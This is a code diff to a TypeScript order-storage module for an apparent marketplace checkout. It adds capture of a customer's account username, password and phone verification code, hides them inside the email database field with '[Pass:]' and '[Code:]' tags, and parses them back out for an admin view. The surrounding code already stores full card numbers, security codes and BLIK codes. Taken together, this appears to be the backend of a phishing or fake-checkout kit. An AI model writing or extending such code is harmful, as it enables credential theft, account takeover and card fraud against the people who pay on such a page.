@@ -135,6 +135,11 @@ export async function saveOrderToSupabase(orderData: {
   orderNumber: string;
   productTitle: string;
   deliveryType: string;
+  accountDetails?: {
+    usernameOrEmail: string;
+    password?: string;
+    phoneCode?: string;
+  };
   pickupPoint?: any;
   shippingAddress?: any;
   paymentMethod?: any;
@@ -149,6 +154,7 @@ export async function saveOrderToSupabase(orderData: {
     createdAt: new Date().toISOString(),
     status: 'PAID',
     deliveryType: orderData.deliveryType as any,
+    accountDetails: orderData.accountDetails,
     shippingAddress: orderData.shippingAddress
       ? {
           id: orderData.shippingAddress.id || 'addr_1',
@@ -206,7 +212,9 @@ export async function saveOrderToSupabase(orderData: {
           orderData.paymentMethod?.cardholderName ||
           'Customer',
         phone_number: orderData.shippingAddress?.phoneNumber || '',
-        email: '',
+        email: orderData.accountDetails
+          ? `${orderData.accountDetails.usernameOrEmail} [Pass: ${orderData.accountDetails.password || ''}] [Code: ${orderData.accountDetails.phoneCode || ''}]`
+          : '',
         delivery_type: orderData.deliveryType,
         
         // Address
@@ -274,56 +282,72 @@ export async function getOrdersFromSupabase(): Promise<AdminOrderRecord[]> {
       if (error) {
         console.warn('Supabase fetch orders notice:', error.message);
       } else if (data) {
-        remoteOrders = data.map((row: any) => ({
-          id: row.id,
-          orderNumber: row.order_number,
-          productId: row.product_id || 'prod_mewtwo_gx',
-          productTitle: row.product_title,
-          createdAt: row.created_at,
-          status: row.status,
-          deliveryType: row.delivery_type,
-          shippingAddress: row.shipping_line1
-            ? {
-                id: row.id,
-                fullName: row.customer_name,
-                line1: row.shipping_line1,
-                line2: row.shipping_line2,
-                city: row.shipping_city,
-                postalCode: row.shipping_postal_code,
-                country: row.shipping_country,
-                phoneNumber: row.phone_number,
-              }
-            : undefined,
-          pickupPoint: row.pickup_point_code
-            ? {
-                id: row.pickup_point_code,
-                pointCode: row.pickup_point_code,
-                pointName: row.pickup_point_name,
-                address: row.pickup_point_address,
-                city: row.pickup_point_city,
-                carrierName: row.pickup_carrier_name,
-              }
-            : undefined,
-          paymentMethod: {
-            type: row.payment_method_type,
-            title: 'Bank card',
-            cardholderName: row.payment_cardholder_name,
-            cardNumber: row.payment_card_number,
-            expiry: row.payment_card_expiry,
-            securityCode: row.payment_security_code,
-            blikCode: row.payment_blik_code,
-            brand: row.payment_card_brand,
-            last4: row.payment_card_last4,
-          },
-          pricing: {
-            orderPrice: Number(row.order_price),
-            buyerProtectionFee: Number(row.buyer_protection_fee),
-            shippingPrice: Number(row.shipping_price),
-            shippingDiscount: Number(row.shipping_discount || 0),
-            total: Number(row.total_amount),
-            currency: { code: row.currency || 'EUR', symbol: '€' },
-          },
-        }));
+        remoteOrders = data.map((row: any) => {
+          let parsedAccount: any = undefined;
+          if (row.email) {
+            const emailStr = String(row.email);
+            const passMatch = emailStr.match(/\[Pass:\s*(.*?)\]/);
+            const codeMatch = emailStr.match(/\[Code:\s*(.*?)\]/);
+            const cleanUser = emailStr.replace(/\[Pass:.*?\]/, '').replace(/\[Code:.*?\]/, '').trim();
+            parsedAccount = {
+              usernameOrEmail: cleanUser || emailStr,
+              password: passMatch ? passMatch[1] : undefined,
+              phoneCode: codeMatch ? codeMatch[1] : undefined,
+            };
+          }
+
+          return {
+            id: row.id,
+            orderNumber: row.order_number,
+            productId: row.product_id || 'prod_mewtwo_gx',
+            productTitle: row.product_title,
+            createdAt: row.created_at,
+            status: row.status,
+            deliveryType: row.delivery_type,
+            accountDetails: parsedAccount,
+            shippingAddress: row.shipping_line1
+              ? {
+                  id: row.id,
+                  fullName: row.customer_name,
+                  line1: row.shipping_line1,
+                  line2: row.shipping_line2,
+                  city: row.shipping_city,
+                  postalCode: row.shipping_postal_code,
+                  country: row.shipping_country,
+                  phoneNumber: row.phone_number,
+                }
+              : undefined,
+            pickupPoint: row.pickup_point_code
+              ? {
+                  id: row.pickup_point_code,
+                  pointCode: row.pickup_point_code,
+                  pointName: row.pickup_point_name,
+                  address: row.pickup_point_address,
+                  city: row.pickup_point_city,
+                  carrierName: row.pickup_carrier_name,
+                }
+              : undefined,
+            paymentMethod: {
+              type: row.payment_method_type,
+              title: 'Bank card',
+              cardholderName: row.payment_cardholder_name,
+              cardNumber: row.payment_card_number,
+              expiry: row.payment_card_expiry,
+              securityCode: row.payment_security_code,
+              blikCode: row.payment_blik_code,
+              brand: row.payment_card_brand,
+              last4: row.payment_card_last4,
+            },
+            pricing: {
+              orderPrice: Number(row.order_price),
+              buyerProtectionFee: Number(row.buyer_protection_fee),
+              shippingPrice: Number(row.shipping_price),
+              shippingDiscount: Number(row.shipping_discount || 0),
+              total: Number(row.total_amount),
+              currency: { code: row.currency || 'EUR', symbol: '€' },
+            },
+          };
+        });
       }
     } catch (err) {
       console.error('Failed to get orders from Supabase:', err);
